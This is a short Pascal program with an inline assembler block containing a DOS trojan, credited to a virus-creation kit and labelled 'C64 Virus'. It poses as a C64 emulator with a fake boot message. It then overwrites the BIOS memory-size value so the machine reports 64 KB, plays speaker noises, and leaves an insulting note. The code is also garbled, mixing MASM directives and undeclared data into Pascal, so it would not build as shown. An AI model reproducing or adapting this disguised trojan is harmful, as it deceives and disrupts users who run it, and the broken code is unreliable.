program c64;



 procedure asem;Assembler;
  asm
 {MINE}{-- C64 Virus
; Created with Nowhere Man's Virus Creation Laboratory v1.00
 Written by Unknown User }

virus_type	equ	3			{ Trojan Horse }
is_encrypted	equ	0			{ We're not encrypted }
tsr_virus	equ	0			{ We're not TSR    }

code		segment byte public
		assume	cs:code,ds:code,es:code,ss:code
		org	0100h

start		label	near

main:		proc	near
		mov	si,offset data00	{ SI points to data                }
		mov	ah,0Eh			{ BIOS display char. function      }
display_loop:   lodsb				{ Load the next char. into AL      }
		or	al,al			{ Is the character a null?         }
		je	disp_strnend		{ If it is, exit                   }
		int	010h			{ BIOS video interrupt             }
		jmp	short display_loop	{ Do the next character            }
disp_strnend:

		mov	dx,0040h		{; First argument is 64             }
		push	es			{; Save ES                          }
		mov	ax,040h			{; Set extra segment to 040h        }
		mov	es,ax                   {; (ROM BIOS)                       }
		mov	word ptr es:[013h],dx	{; Store new RAM ammount            }
		pop	es			{; Restore ES                       }
                                                {; First argument is 32              }
new_shot:       push	cx			{; Save the current count            }
		mov 	dx,0140h		{; DX holds pitch                    }
		mov   	bx,0100h		{; BX holds shot duration            }
		in    	al,061h			{; Read the speaker port             }
		and   	al,11111100b		{; Turn off the speaker bit          }
fire_shot:	xor	al,2                    {; Toggle the speaker bit            }
		out	061h,al			{; Write AL to speaker port          }
		add     dx,09248h		{;                                   }
		mov	cl,3                    {;                                   }
		ror	dx,cl			{; Figure out the delay time         }
		mov	cx,dx                   {;                                   }
		and	cx,01FFh                {;                                   }
		or	cx,10                   {;                                   }
shoot_pause:	loop	shoot_pause             {; Delay a bit                       }
		dec	bx			{; Are we done with the shot?        }
		jnz	fire_shot		{; If not, pulse the speaker         }
		and   	al,11111100b		{; Turn off the speaker bit          }
		out   	061h,al			{; Write AL to speaker port          }
		mov   	bx,0002h                {; BX holds delay time (ticks)       }
		xor   	ah,ah			{; Get time function                 }
		int   	1Ah			{; BIOS timer interrupt              }
		add   	bx,dx                   {; Add current time to delay         }
shoot_delay:    int   	1Ah			{; Get the time again                }
		cmp   	dx,bx			{; Are we done yet?                  }
		jne   	shoot_delay		{; If not, keep checking             }
		pop	cx			{; Restore the count                 }
		loop	new_shot		{; Do another shot                   }


		mov	ax,04C00h		{; DOS terminate function            }
		int	021h
main		endp

data00		C64 Emulator is booting...
		Please Wait...


vcl_marker	db	"[VCL]",0		{; VCL creation marker               }


note		db	"C64 Virus.. You sad Bastard..."

finish		label	near

code		ends

		  end;

begin
   asem;
end.
